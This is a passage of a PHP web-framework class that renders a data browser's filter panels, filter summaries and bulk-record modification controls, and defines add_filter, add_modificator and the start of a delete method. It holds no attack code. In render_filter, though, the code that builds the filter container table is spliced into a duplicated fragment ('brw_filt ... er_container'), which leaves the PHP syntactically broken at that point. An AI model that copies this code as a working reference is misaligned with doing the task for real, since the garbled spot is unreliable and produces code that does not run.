            $filter_row->add( new table_cell( $cell_attributes
                                            , $combo
                                            )
                            );
            if (safe($filter, "multiple")) {
              $cell_attributes = array( 'nowrap' => true
                                      , 'align'  => 'left'
                                      );
              $filter_row->add( new table_cell( $cell_attributes
                                              , new javascript_image_href( $this->js_post_back('brw_filter_set')
                                                                         , SHARED_RESOURCES_URL.'img_set.gif' 
                                                                         , array( 'title' => 'Apply' )
                                                                         )
                                              )
                              );
              if (count($value)) {
                $cell_attributes['class'] = 'control';
                $filter_row->add( new table_cell( $cell_attributes
                                                , new javascript_image_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                           , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                           , array( 'title' => 'Clear' )
                                                                           )
                                                )
                                );
              }
            }
            break;
          case 'month':
            $select = new combo( array( 'id'       => $id
                                      , 'onchange' => $this->js_post_back('brw_filter_set')
                                      ));
            if (!safe($filter, 'always_set'))                          
              $select->add(new combo_item(null, ($this->show_all_as_space?'':trn('&lt;All&gt;'))));

            $current_month = strftime(INTERNAL_MONTH_FORMAT);
            $current_month_text = strftime_(DISPLAY_MONTH_FORMAT).' (current)';
            $month = $value;
            if (!$month)
              $month = strftime(INTERNAL_MONTH_FORMAT);
            $month_parts = explode('-', $month);
            for($i = -12; $i < 5; $i++) {
              $val  = strftime(INTERNAL_MONTH_FORMAT, mktime(0, 0, 0, $month_parts[1] + $i, 1, $month_parts[0]));
              $text = strftime_(DISPLAY_MONTH_FORMAT, mktime(0, 0, 0, $month_parts[1] + $i, 1, $month_parts[0]));;
              if ($val == $current_month) {
                $text .= ' '.trn('(current)');
                $current_month = '';
              }
              $select->add(new html_option($text, array( 'value'    => $val
                                                       , 'selected' => ($val == $value))));
            }
            if ($current_month) 
              $select->add(new html_option($current_month_text, array('value' => $current_month)));                                                       
            $filter_row->add(new table_cell( array("class" => "control")
                                                 , $select));
            break;
          case 'date':
            if ($value) {
              $filter_row->add(new table_cell(array( 'nowrap' => true
                                                        , 'align'  => 'left')
                                                  , new javascript_image_href( $this->js_post_back('brw_filter_prior_day', $filter['name'])
                                                                             , SHARED_RESOURCES_URL.'img_left.gif' 
                                                                             , array( 'title' => 'Prior day' ))));
            }
                       
            if ($value) 
              $display_value = strftime_(safe($filter, 'date_format', DISPLAY_DATE_FORMAT), str_to_date($value));
            else  
              $display_value = null;
            $filter_row->add(new table_cell( new hidden($id, $value)
                                                , new html_div($display_value, array( 'id'    => $id.__HTML_CONTROL_NAME_SEPARATOR.'v'
                                                                                    , 'class' => 'date'
                                                                                    ))      
                                                                  ));
            if ($value)
              $filter_row->add(new table_cell( array( 'nowrap' => true
                                                         , 'align'  => 'left')
                                                  , new javascript_image_href( $this->js_post_back('brw_filter_next_day', $filter['name'])
                                                                             , SHARED_RESOURCES_URL.'img_right.gif' 
                                                                             , array( 'title' => 'Next day' ))));
            if ($value)
              $filter_row->add(new table_cell( array( 'nowrap' => true
                                                         , 'align'  => 'left')
                                                  , new date_picker( array( 'input_field'    => $id
                                                                          , 'display_area'   => $id.__HTML_CONTROL_NAME_SEPARATOR.'v'
                                                                          , 'display_format' => safe($filter, 'date_format', DISPLAY_DATE_FORMAT)
                                                                          , 'save_format'    => INTERNAL_DATE_FORMAT
                                                                          , 'on_change'      => $this->js_post_back('brw_filter_set')
                                                                          )
                                                                   )));
            else
              $filter_row->add(new table_cell( array( 'nowrap' => true
                                                         , 'align'  => 'left'
                                                         , 'class'  => 'control')
                                                  , new date_picker( array( 'input_field'    => $id
                                                                          , 'display_area'   => $id.__HTML_CONTROL_NAME_SEPARATOR.'v'
                                                                          , 'display_format' => safe($filter, 'date_format', DISPLAY_DATE_FORMAT)
                                                                          , 'save_format'    => INTERNAL_DATE_FORMAT
                                                                          , 'on_change'      => $this->js_post_back('brw_filter_set')
                                                                          )
                                                                   )));
            if ($value and !safe($filter, 'always_set'))
              $filter_row->add(new table_cell( array( 'nowrap' => true
                                                         , 'align'  => 'left'
                                                         , 'class'  => 'control')
                                                  , new javascript_image_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                             , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                             , array( 'title' => 'Clear date' ))));
            break;
          default:
            $attributes = array( 'id'    => $id
                               , 'value' => $value
                               , 'on_enter_pressed' => $this->js_post_back('brw_filter_set'));
            $cell_attributes = array();
            if (safe($filter, "style")) {
              $cell_attributes = array('style' => $filter["style"]);
            }
            if (safe($filter, "width")) {
              $attributes["style"] = "width:".safe($filter, "width")."px;";
            }
            if ($value) {
              $filter_row->add( new table_cell( $cell_attributes
                                              , new filter_edit($attributes)
                                              )
                              );
              if (!safe($filter, 'always_set')) {
                $cell_attributes['class'] = 'control';
                $filter_row->add( new table_cell( $cell_attributes
                                                , new javascript_image_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                           , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                           , array( 'title' => 'Clear text')
                                                                           )
                                                )
                                );
              }
            } else {
              $cell_attributes['class'] = 'control';
              $filter_row->add( new table_cell( $cell_attributes
                                              , new filter_edit($attributes)
                                              )
                              );
            }
            break;
        }
    
        $filter_control = new html_div( array( "class" => "brw_filter_panel" )
                                             , new table( array('cellspacing' => 0, "class" => "brw_filter")
                                                        , $filter_row));
        if (safe($filter, 'group'))
          $groups[$filter['group']]['container']->add($filter_control);
        else   
          $filter_container->add($filter_control);
      }
    }
    
    foreach ($groups as $group) {
//      $filter_container->add( new html_div( new html_div( array("class" => "brw_filter_panel")
//                                                        , 'AAA')
//                                          , $group
//                                          ));
      $filter_container->add(new html_div( array('class' => 'brw_filter_group')
                                         , $group['switcher']
                                         , $group['container']));
    }

    $filter_row = new table_row();
    $filter_row->add($filter_container);

    if ($this->visible('reset_filter')) {
      $filter_row->add(new table_cell( new table( array('cellspacing' => 4)
                                                , new table_row( new table_cell(new javascript_image_href( $this->js_post_back('brw_filter_reset')
                                                                                                         , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                                                         , array('alt'   => trn('Reset'))))
                                                               , new table_cell(new javascript_href( $this->js_post_back('brw_filter_reset')
                                                                                                   , trn('Reset')))))));
    }

    if (!$in_page)
      $filter_table = new table(array( 'cellspacing' => 0
                                     , 'class'       => 'brw_filt            , 'class'       => 'brw_filter_container'));
    else                                 
      $filter_table = new table(array( 'cellspacing' => 0
       er_container'));
    else                                 
      $filter_table = new table(array( 'cellspacing' => 0
                                     , 'class'       => 'brw_filter_container_in_page'));
    $filter_table->add($filter_row);
    

    $container->add($filter_table);

  }

  function render_filter_info($container, $in_page = false) {

    global $url;
    global $ui;

    $filter_container = new table_cell(array("width" => "100%"));

    foreach($this->filters as $filter_name => $filter) {
      if ($this->is_filter_visible($filter)) {
        $id    = $this->context_id('filter['.$filter['name'].']');
        $type  = safe($filter, 'type');
        $value = $this->filter($filter['name']);  
        if ($value) {
          $filter_row = new table_row();
          if (safe($filter, 'title'))
            if (!$this->is_filter_empty($filter['name']))
              $filter_row->add(new table_cell(new html_b($filter['title'])));
            else
              $filter_row->add(new table_cell($filter['title']));
          switch ($type) {
            case 'alphabetical':
              if (strlen($value))
                $filter_row->add(new table_cell( array( 'nowrap' => true
                                                      , 'align'  => 'left')
                                                      , new javascript_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                           , trn('All'))));
              if (safe($filter, 'chars_sql')) {
                global $db;
                $chars = $db->values($filter['chars_sql']);
                for ($i = 0; $i < count($chars); $i++) {
                  $ch = $chars[$i];
                  if ($value == $ch)
                    $filter_row->add(new table_cell(new text($ch)));
                  else
                    $filter_row->add(new table_cell(new javascript_href($this->js_post_back('brw_alphabet_filter_set', $ch), $ch)));
                }
              } else {
                for ($ch = ord('0'); $ch <= ord('9'); $ch++) {
                  if ($value == chr($ch))
                    $filter_row->add(new table_cell(new text(chr($ch))));
                  else
                    $filter_row->add(new table_cell(new javascript_href($this->js_post_back('brw_alphabet_filter_set', chr($ch)), chr($ch))));
                }
                for ($ch = ord('A'); $ch <= ord('Z'); $ch++) {
                  if ($value == chr($ch))
                    $filter_row->add(new table_cell(new text(chr($ch))));
                  else
                    $filter_row->add(new table_cell(new javascript_href($this->js_post_back('brw_alphabet_filter_set', chr($ch)), chr($ch))));
                }
              }
              break;
            case 'yesno':
              if ($value)
                $filter_row->add(new table_cell( new text('Yes')));
              else  
                $filter_row->add(new table_cell( new text('No')));
              break;
            case 'checkbox':
              $attributes = array();
              $attributes["id"]    = $id;
              if ($value) {
                $attributes["checked"] = true;
                $attributes['onclick'] = $this->js_post_back('brw_filter_clear_one', $filter['name']);
              } else {
                $attributes['onclick'] = $this->js_post_back('brw_filter_set');
              }
              $filter_row->add(new table_cell(new html_checkbox($attributes)));
              break;
            case 'combo_tree':
            case 'combo_plain_tree':
              $custom_values = array();
              if (!safe($filter, 'always_set') and (!safe($filter, 'disable_null_filter'))) {
                $custom_values['-1'] = trn('(Empty)');
                $custom_values['-2'] = trn('(Not Empty)');
              }
              $attributes = array();
              if (safe($filter, "size"))
                $attributes["size"]     = $filter["size"];
              if (safe($filter, "multiple")) {
                $attributes["multiple"] = true;
                $attributes["id"]       = $id."[]";
              } else {
                $attributes["onchange"] = $this->js_post_back('brw_filter_set');
                $attributes["id"]       = $id;
              }
              $filter_row->add(new table_cell( new db_tree_combo( array( 'table'         => safe($filter, 'combo_table')
                                                                       , 'sql_text'      => safe($filter, 'combo_sql')
                                                                       , 'key_field'     => safe($filter, 'combo_key_field')
                                                                       , 'name_field'    => safe($filter, 'combo_name_field')
                                                                       , 'order_field'   => safe($filter, 'combo_order_field')
                                                                       , 'parent_field'  => safe($filter, 'combo_parent_field')
                                                                       , 'selected'      => $value
                                                                       , "empty_name"    => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                                                                       , 'exceptions'    => safe($filter, 'combo_exceptions')
                                                                       , 'required'      => safe($filter, 'required')
                                                                       , 'plain'         => ($type == 'combo_plain_tree')
                                                                       , 'multiple'      => safe($filter, 'multiple')
                                                                       , 'custom_values' => $custom_values
                                                                       )
                                                                , $attributes )));
              if (safe($filter, "multiple")) {
                $filter_row->add(new table_cell( array( 'nowrap' => true
                                                      , 'align'  => 'left')
                                                    , new javascript_image_href( $this->js_post_back('brw_filter_set')
                                                                               , SHARED_RESOURCES_URL.'img_set.gif' 
                                                                               , array( 'title' => 'Apply' ))));
                if (count($value))
                  $filter_row->add(new table_cell( array( 'nowrap' => true
                                                        , 'align'  => 'left'
                                                        , 'class'  => 'control')
                                                      , new javascript_image_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                                 , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                                 , array( 'title' => 'Clear' ))));
              }
              break;
            case 'combo':
              $filter_row->add(new table_cell(array( "class" => "control" )
                                                   , new db_combo(array( 'table'         => safe($filter, 'combo_table')
                                                                       , 'sql_text'      => safe($filter, 'combo_sql')
                                                                       , 'key_field'     => safe($filter, 'combo_key_field')
                                                                       , 'name_field'    => safe($filter, 'combo_name_field')
                                                                       , 'order_field'   => safe($filter, 'combo_order_field')
                                                                       , 'selected'      => $value
                                                                       , "empty_name"    => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                                                                       , 'exceptions'    => safe($filter, 'combo_exceptions')
                                                                       , 'required'      => safe($filter, 'required')
                                                                       , 'always_set'    => safe($filter, 'always_set')
                                                                       , "read_only"     => true
                                                                       )
                                                                , array( 'onchange'    => $this->js_post_back('brw_filter_set')
                                                                       , 'id'          => $id
                                                                       ))));
              break;
            case 'lookup':
              $options = array( "table"             => safe($filter, "lookup_table")
                              , "sql_text"          => safe($filter, "lookup_sql")
                              , "ajax_method"       => safe($filter, "lookup_ajax_method")
                              , "ajax_param"        => safe($filter, "lookup_ajax_param")
                              , "key_field"         => safe($filter, "lookup_table_key_field")
                              , "order_field"       => safe($filter, "lookup_table_order_field")
                              , "name_field"        => safe($filter, "lookup_table_name_field")
                              , "min_length"        => safe($filter, "lookup_min_length")
                              , "value"             => $value
                              , "base_table_alias"  => safe($filter, "lookup_table_alias")
                              , "empty_name"        => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                              , "on_select"         => $this->js_post_back('brw_filter_set')
                              );
              $attributes = array( "id" => $id );
              if (safe($filter, "width"))
                $attributes["style"] = "width:".safe($filter, "width")."px;";
              $filter_row->add(new table_cell( array("class" => "control")
                                             , new db_lookup( $options
                                                            , $attributes)));
              break;                                                          
            case 'lookup_text':
              $options = array( "table"             => safe($filter, "lookup_table")
                              , "sql_text"          => safe($filter, "lookup_sql")
                              , "ajax_method"       => safe($filter, "lookup_ajax_method")
                              , "ajax_param"        => safe($filter, "lookup_ajax_param")
                              , "key_field"         => safe($filter, "lookup_table_key_field")
                              , "order_field"       => safe($filter, "lookup_table_order_field")
                              , "name_field"        => safe($filter, "lookup_table_name_field")
                              , "min_length"        => safe($filter, "lookup_min_length")
                              , "value"             => safe($value, 'value')
                              , "text"              => safe($value, 'text')
                              , "base_table_alias"  => safe($filter, "lookup_table_alias")
                              , "empty_name"        => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                              , "text_allowed"      => true
                              , "on_select"         => $this->js_post_back('brw_filter_set')
                              , "on_enter_pressed"  => $this->js_post_back('brw_filter_set')
                              );
              $attributes = array( "id" => $id );
              if (safe($filter, "width"))
                $attributes["style"] = "width:".safe($filter, "width")."px;";
              $filter_row->add(new table_cell( array("class" => "control")
                                             , new db_lookup( $options
                                                            , $attributes)));
              if (strlen(safe($value, "value")) or strlen(safe($value, "text")))
                $filter_row->add(new table_cell( array("class" => "control")
                                                    , new javascript_image_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                               , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                               , array( 'title' => 'Clear text'))));
              break;                                                          
            case 'combo_master_detail':
              $filter_row->add(new table_cell( array("class" => "control")
                                                  , new db_master_detail_combo( array( 'sql1'         => safe($filter, 'combo_sql1')
                                                                                     , 'sql2'         => safe($filter, 'combo_sql2')
                                                                                     , 'parent_field' => safe($filter, 'combo_parent_field')
                                                                                     , 'selected'     => $value
                                                                                     , "empty_name"   => ($this->show_all_as_space?' ':trn('&lt;All&gt;'))
                                                                                     )
                                                                              , array( 'onchange'    => $this->js_post_back('brw_filter_set')
                                                                                     , 'id'          => $id
                                                                                     ))));
              break;
            case 'custom_list':
              $idx = 1;
              foreach($filter['list'] as $item) {
                if (intval($value) == $idx)
                 $filter_row->add(new table_cell( new text($item['name'])));
                $idx++;
              }
              break;
            case 'month':
              $select = new combo( array( 'id'       => $id
                                        , 'onchange' => $this->js_post_back('brw_filter_set')
                                        ));
              if (!safe($filter, 'always_set'))                          
                $select->add(new combo_item(null, ($this->show_all_as_space?'':trn('&lt;All&gt;'))));

              $current_month = strftime(INTERNAL_MONTH_FORMAT);
              $current_month_text = strftime_(DISPLAY_MONTH_FORMAT).' (current)';
              $month = $value;
              if (!$month)
                $month = strftime(INTERNAL_MONTH_FORMAT);
              $month_parts = explode('-', $month);
              for($i = -12; $i < 5; $i++) {
                $val  = strftime(INTERNAL_MONTH_FORMAT, mktime(0, 0, 0, $month_parts[1] + $i, 1, $month_parts[0]));
                $text = strftime_(DISPLAY_MONTH_FORMAT, mktime(0, 0, 0, $month_parts[1] + $i, 1, $month_parts[0]));;
                if ($val == $current_month) {
                  $text .= ' (current)';
                  $current_month = '';
                }
                $select->add(new html_option($text, array( 'value'    => $val
                                                         , 'selected' => ($val == $value))));
              }
              if ($current_month) 
                $select->add(new html_option($current_month_text, array('value' => $current_month)));                                                       
              $filter_row->add(new table_cell( array("class" => "control")
                                                  , $select));
              break;
            case 'date':
              $filter_row->add(new table_cell( new text(strftime_(safe($filter, 'date_format', DISPLAY_DATE_FORMAT), str_to_date($value)))));
              break;
            default:
              $attributes = array( 'id'    => $id
                                 , 'value' => $value
                                 , 'on_enter_pressed' => $this->js_post_back('brw_filter_set'));
              if (safe($filter, "width"))
                $attributes["style"] = "width:".safe($filter, "width")."px;";
              if ($value) {
                $filter_row->add(new table_cell(new filter_edit($attributes)));
                if (!safe($filter, 'always_set'))                                                      
                  $filter_row->add(new table_cell( array("class" => "control")
                                                 , new javascript_image_href( $this->js_post_back('brw_filter_clear_one', $filter['name'])
                                                                            , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                            , array( 'title' => 'Clear text'))));
              } else {
                $filter_row->add(new table_cell( array("class" => "control")
                                                    , new filter_edit($attributes)));
              }
              break;
          }
      
          $filter_container->add(new html_div( array("class" => "brw_filter_panel")
                                             , new table( array('cellspacing' => 0, "class" => "brw_filter")
                                                        , $filter_row)));
        }
      }
    }

    $filter_row = new table_row();
    $filter_row->add($filter_container);

    if (!$in_page)
      $filter_table = new table(array( 'cellspacing' => 0
                                     , 'class'       => 'brw_filter_container'));
    else                                 
      $filter_table = new table(array( 'cellspacing' => 0
                                     , 'class'       => 'brw_filter_container_in_page'));
    $filter_table->add($filter_row);

    $container->add($filter_table);

  }

  function render_modificator($container, $in_page = false) {

    global $url;
    global $ui;

    $modificator_container = new table_cell(array("width" => "100%"));

    foreach($this->modificators as $modificator_name => $modificator) {
      $modificator_row = new table_row();
      if (safe($modificator, 'title'))
        if (!$this->is_modificator_empty($modificator_name))
          $modificator_row->add(new table_cell(new html_b($modificator['title'])));
        else
          $modificator_row->add(new table_cell($modificator['title']));
      $id    = $this->context_id('modificator['.$modificator_name.']');
      $type  = safe($modificator, 'type');
      $value = $this->modificator($modificator_name);  
      switch ($type) {
        case 'yesno':
          $modificator_row->add(new table_cell( new yesno_combo( array( 'selected'   => $value
                                                                      , 'empty_name' => trn('&lt;No change&gt;'))
                                                               , array( 'id'         => $id))));
          break;
        case 'combo_tree':
        case 'combo_plain_tree':
          $attributes = array();
          if (safe($modificator, "size"))
            $attributes["size"]     = $modificator["size"];
          if (safe($modificator, 'post_on_change'))  
            $attributes["onchange"] = $this->js_post_back('brw_modificator_change');
          $attributes["id"]       = $id;

          $modificator_row->add(new table_cell( new db_tree_combo( array( 'table'        => safe($modificator, 'combo_table')
                                                                        , 'sql_text'     => safe($modificator, 'combo_sql')
                                                                        , 'key_field'    => safe($modificator, 'combo_key_field')
                                                                        , 'name_field'   => safe($modificator, 'combo_name_field')
                                                                        , 'order_field'  => safe($modificator, 'combo_order_field')
                                                                        , 'parent_field' => safe($modificator, 'combo_parent_field')
                                                                        , 'selected'     => $value
                                                                        , "empty_name"   => trn('&lt;No change&gt;')
                                                                        , 'exceptions'   => safe($modificator, 'combo_exceptions')
                                                                        , 'required'     => safe($modificator, 'required')
                                                                        , 'plain'        => ($type == 'combo_plain_tree')
                                                                        , 'multiple'     => safe($modificator, 'multiple')
                                                                        )
                                                                 , $attributes )));
          break;
        case 'combo':
          $attributes = array();
          if (safe($modificator, "size"))
            $attributes["size"]     = $modificator["size"];
          if (safe($modificator, 'post_on_change'))  
            $attributes["onchange"] = $this->js_post_back('brw_modificator_change');
          $attributes["id"]       = $id;

          $modificator_row->add(new table_cell(array( "class" => "control")
                                                    , new db_combo(array( 'table'       => safe($modificator, 'combo_table')
                                                                        , 'sql_text'    => safe($modificator, 'combo_sql')
                                                                        , 'key_field'   => safe($modificator, 'combo_key_field')
                                                                        , 'name_field'  => safe($modificator, 'combo_name_field')
                                                                        , 'order_field' => safe($modificator, 'combo_order_field')
                                                                        , 'selected'    => $value
                                                                        , "empty_name"  => trn('&lt;No change&gt;')
                                                                        , 'exceptions'  => safe($modificator, 'combo_exceptions')
                                                                        , 'required'    => safe($modificator, 'required')
                                                                        , 'always_set'  => safe($modificator, 'always_set')
                                                                        , "group_field"   => safe($modificator, "combo_group_field")
                                                                        )
                                                                  , $attributes)));
          break;
        case 'ajax_combo':
          $attributes = array();
          if (safe($modificator, "size"))
            $attributes["size"]     = $modificator["size"];
          if (safe($modificator, 'post_on_change'))  
            $attributes["onchange"] = $this->js_post_back('brw_modificator_change');
          $attributes["id"]       = $id;

          $modificator_row->add(new table_cell(array( "class" => "control")
                                                    , new ajax_db_combo(array( 'table'       => safe($modificator, 'combo_table')
                                                                        , 'sql_text'    => safe($modificator, 'combo_sql')
                                                                        , 'key_field'   => safe($modificator, 'combo_key_field')
                                                                        , 'name_field'  => safe($modificator, 'combo_name_field')
                                                                        , 'order_field' => safe($modificator, 'combo_order_field')
                                                                        , 'selected'    => $value
                                                                        , "empty_name"  => trn('&lt;No change&gt;')
                                                                        , 'exceptions'  => safe($modificator, 'combo_exceptions')
                                                                        , 'required'    => safe($modificator, 'required')
                                                                        , 'always_set'  => safe($modificator, 'always_set')
                                                                        , "group_field"   => safe($modificator, "combo_group_field")
                                                                        , "ajax_method"   => safe($modificator, "ajax_method")
                                                                        , "ajax_params"   => safe($modificator, "ajax_params")
                                                                        )
                                                                  , $attributes)));
          break;
        case 'lookup':
          $options = array( "table"             => safe($modificator, "lookup_table")
                          , "sql_text"          => safe($modificator, "lookup_sql")
                          , "ajax_method"       => safe($modificator, "lookup_ajax_method")
                          , "ajax_param"        => safe($modificator, "lookup_ajax_param")
                          , "order_field"       => safe($modificator, "lookup_order_field")
                          , "min_length"        => safe($modificator, "lookup_min_length")
                          , "value"             => $value
                          , "base_table_alias"  => safe($modificator, "lookup_table_alias")
                          , "empty_name"        => trn('&lt;No change&gt;')
                          );
          if (safe($modificator, 'post_on_change'))  
            $options["on_select"] = $this->js_post_back('brw_modificator_change');

          $attributes = array();
          if (safe($modificator, "width"))
            $attributes["style"] = "width:".safe($modificator, "width")."px;";
          $attributes["id"] = $id;

          $modificator_row->add(new table_cell( array("class" => "control")
                                              , new db_lookup( $options
                                                             , $attributes)));
          break;                                                          
        case 'combo_master_detail':
          $attributes = array();
          if (safe($modificator, "size"))
            $attributes["size"]     = $modificator["size"];
          if (safe($modificator, 'post_on_change'))  
            $attributes["onchange"] = $this->js_post_back('brw_modificator_change');
          $attributes["id"]       = $id;

          $modificator_row->add(new table_cell( array("class" => "control")
                                              , new db_master_detail_combo( array( 'sql1'         => safe($modificator, 'combo_sql1')
                                                                                 , 'sql2'         => safe($modificator, 'combo_sql2')
                                                                                 , 'parent_field' => safe($modificator, 'combo_parent_field')
                                                                                 , 'selected'     => $value
                                                                                 , "empty_name"   => trn('&lt;No change&gt;')
                                                                                 )
                                                                          , $attributes)));
          break;
        case 'custom_list':
        case 'clear':
          $attributes = array();
          if (safe($modificator, "size"))
            $attributes["size"]     = $modificator["size"];
          if (safe($modificator, 'post_on_change'))  
            $attributes["onchange"] = $this->js_post_back('brw_modificator_change');
          $attributes["id"]       = $id;

          $combo = new combo($attributes);
          $combo->add(new combo_item(null, trn('&lt;No change&gt;')));

          foreach($modificator['list'] as $item) 
            $combo->add(new combo_item($item['field'], $item['name'], ($value == $item['field'])));
          $modificator_row->add(new table_cell( array( "class" => "control")
                                                     , $combo));
          break;
        case 'date':
          if ($value) {
            $modificator_row->add(new table_cell(array( 'nowrap' => true
                                                      , 'align'  => 'left')
                                                , new javascript_image_href( $this->js_post_back('brw_modificator_prior_day', $modificator_name)
                                                                           , SHARED_RESOURCES_URL.'img_left.gif' 
                                                                           , array( 'title' => 'Prior day' ))));
          }
                     
          if ($value) 
            $display_value = strftime_(safe($modificator, 'date_format', DISPLAY_DATE_FORMAT), str_to_date($value));
          else  
            $display_value = null;
          $modificator_row->add(new table_cell( new hidden($id, $value)
                                              , new html_div($display_value, array( 'id'    => $id.__HTML_CONTROL_NAME_SEPARATOR.'v'
                                                                                  , 'class' => 'date'
                                                                                  ))      
                                                                ));
          if ($value)
            $modificator_row->add(new table_cell( array( 'nowrap' => true
                                                       , 'align'  => 'left')
                                                , new javascript_image_href( $this->js_post_back('brw_modificator_next_day', $modificator_name)
                                                                           , SHARED_RESOURCES_URL.'img_right.gif' 
                                                                           , array( 'title' => 'Next day' ))));
          if ($value)
            $modificator_row->add(new table_cell( array( 'nowrap' => true
                                                       , 'align'  => 'left')
                                                , new date_picker( array( 'input_field'    => $id
                                                                        , 'display_area'   => $id.__HTML_CONTROL_NAME_SEPARATOR.'v'
                                                                        , 'display_format' => safe($modificator, 'date_format', DISPLAY_DATE_FORMAT)
                                                                        , 'save_format'    => INTERNAL_DATE_FORMAT
                                                                        )
                                                                 )));
          else
            $modificator_row->add(new table_cell( array( 'nowrap' => true
                                                       , 'align'  => 'left'
                                                       , 'class'  => 'control')
                                                , new date_picker( array( 'input_field'    => $id
                                                                        , 'display_area'   => $id.__HTML_CONTROL_NAME_SEPARATOR.'v'
                                                                        , 'display_format' => safe($modificator, 'date_format', DISPLAY_DATE_FORMAT)
                                                                        , 'save_format'    => INTERNAL_DATE_FORMAT
                                                                        )
                                                                 )));
          if ($value)
            $modificator_row->add(new table_cell( array( 'nowrap' => true
                                                       , 'align'  => 'left'
                                                       , 'class'  => 'control')
                                                , new javascript_image_href( $this->js_post_back('brw_modificator_clear_one', $modificator_name)
                                                                           , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                           , array( 'title' => 'Clear date' ))));
          break;
        default:
          $attributes = array( 'id'    => $id
                             , 'value' => $value);
          if (safe($modificator, "width"))
            $attributes["style"] = "width:".safe($modificator, "width")."px;";
          if ($value) {
            $modificator_row->add(new table_cell(new edit($attributes)));
          } else {
            $modificator_row->add(new table_cell( array("class" => "control")
                                                , new edit($attributes)));
          }
          break;
      }
    
      $modificator_container->add(new html_div( array("class" => "brw_filter_panel")
                                              , new table( array('cellspacing' => 0, "class" => "brw_filter")
                                                        , $modificator_row)));
    }

    $modificator_row = new table_row();
    $modificator_row->add($modificator_container);

    $modificator_row->add(new table_cell( new table( array('cellspacing' => 0, "class" => "brw_filter")
                                                   , new table_row( new table_cell(new javascript_image_href( $this->js_post_back('brw_modificator_modify', null, trn('WARNING!!! Are you sure you want perform modification of selected records?'))
                                                                                                            , SHARED_RESOURCES_URL.'img_set.gif'
                                                                                                            , array('alt'   => trn('Modify'))))
                                                                  , new table_cell(new javascript_href( $this->js_post_back('brw_modificator_modify', null, trn('WARNING!!! Are you sure you want perform modification of selected records?'))
                                                                                                      , trn('Modify')))))));
    $modificator_row->add(new table_cell( new table( array('cellspacing' => 0, "class" => "brw_filter")
                                                   , new table_row( new table_cell(new javascript_image_href( $this->js_post_back('brw_modificator_clear')
                                                                                                            , SHARED_RESOURCES_URL.'img_clear.gif'
                                                                                                            , array('alt'   => trn('Clear'))))
                                                                  , new table_cell(new javascript_href( $this->js_post_back('brw_modificator_clear')
                                                                                                      , trn('Clear')))))));

    if (!$in_page)
      $modificator_table = new table(array( 'cellspacing' => 0
                                          , 'class'       => 'brw_filter_container'));
    else                                 
      $modificator_table = new table(array( 'cellspacing' => 0
                                          , 'class'       => 'brw_filter_container_in_page'));
    $modificator_table->add($modificator_row);
    
    $container->add($modificator_table);

  }

  function field($row, $field_name, $required = true) {

    $result = $this->do_fill_field($row, $field_name);
    if (strlen($result) == 0) {
      if (array_key_exists($field_name, $row))
        $result = $row[$field_name];
      else 
      if ($required)
        critical_error('Field '.$field_name.' not found');
    }
    return $result;

  }

  function do_before_delete($key) { }
  function do_delete($key) { return true; }
  function do_after_delete($key) { }

  function do_before_render_body() { }
  function render_body() { }
  function do_after_render_body() { }

  function do_before_export_body() { return ''; }
  function do_after_export_body() { return ''; }

  function add_button($button) {
   
    array_push($this->buttons, $button); 

  }

  function add_filter($filter) { 

    if (safe($filter, "type") == "alphabetical")
      $filter["name"] = "alphabet";
      
    //global $BROWSER_FILTER_DEF;
    //check_params_against($filter, $BROWSER_FILTER_DEF);
     
    $this->filters[$filter["name"]] = $filter;
    
    if (array_key_exists('default', $filter) and (!$this->is_filter_set($filter['name']) or safe($filter, 'hidden'))) {
      if ((safe($filter, 'type') == 'date') and (safe($filter, 'default') == 'today'))
        $this->set_filter($filter['name'], strftime(INTERNAL_DATE_FORMAT));
      else
      if ((safe($filter, 'type') == 'month') and (safe($filter, 'default') == 'today'))
        $this->set_filter($filter['name'], strftime(INTERNAL_MONTH_FORMAT));
      else 
      if ((safe($filter, 'type') == 'date') and $filter['default'])
        $this->set_filter($filter['name'], strftime(INTERNAL_DATE_FORMAT, $filter['default']));
      else  
        $this->set_filter($filter['name'], $filter['default']);
    } else 
    if (!array_key_exists('default', $filter) and array_key_exists('always_set', $filter) and !$this->filter($filter['name'])) {
      global $db;
      $default = null;
      if (safe($filter, 'combo_sql')) 
        $default = $db->value($filter['combo_sql']);
      else  
      if (safe($filter, 'combo_table'))
        $default = $db->value("SELECT id FROM ".$filter['combo_table']." LIMIT 0,1");
      else
      if (safe($filter, 'type') == 'custom_list')
        $default = 1;
      if ($default)
        if (safe($filter, 'multiple'))
          $this->set_filter($filter['name'], array($default));
        else
          $this->set_filter($filter['name'], $default);
    } else
    if (!array_key_exists('default', $filter) and array_key_exists('select_first', $filter) and !$this->is_filter_set($filter['name'])) {
      global $db;
      $default = null;
      if (safe($filter, 'combo_table'))
        $default = $db->value("SELECT id FROM ".$filter['combo_table']." LIMIT 0,1");
      else
      if (safe($filter, 'combo_sql')) 
        $default = $db->value($filter['combo_sql']);
      else
      if (safe($filter, 'type') == 'custom_list')
        $default = 1;
      if ($default)
        if (safe($filter, 'multiple'))
          $this->set_filter($filter['name'], array($default));
        else
          $this->set_filter($filter['name'], $default);
    }


  }

  function add_modificator($modificator) { 

    //global $BROWSER_MODIFICATOR_DEF;
    //check_params_against($modificator, $BROWSER_MODIFICATOR_DEF);
     
    if (!safe($modificator, 'name'))
      $modificator['name'] = $modificator['field'];
      
    $this->modificators[$modificator['name']] = $modificator;

    $this->add_capability("select");
    $this->add_capability("select_all");
    
  }

  function delete($key) {

    global $dm;
                        
    if ($this->do_delete($key)) {
      if ($this->table) {
        $this->do_before_delete($key);
        $dm->table($this->table, 'key_field', $this->key_field);
